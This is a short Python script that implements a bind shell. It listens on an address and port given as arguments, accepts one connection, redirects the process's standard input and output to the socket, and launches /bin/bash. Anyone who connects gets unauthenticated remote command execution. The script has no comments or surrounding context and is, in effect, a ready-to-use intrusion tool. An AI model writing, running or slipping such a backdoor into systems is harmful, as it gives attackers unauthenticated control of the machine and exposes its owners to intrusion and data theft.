#!/usr/bin/env python

import subprocess
import os
import sys
import socket

def shell(addr, port):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((addr, int(port)))
        sock.listen(1)
        client, addr = sock.accept()
        os.dup2(client.fileno(), 0)
        os.dup2(client.fileno(), 1)
        os.dup2(client.fileno(), 2)
        subprocess.call(["/bin/bash"])
        sock.close()
        client.close()
	
def main():
	shell(sys.argv[1], sys.argv[2])	
	
if __name__ == '__main__':
	main()
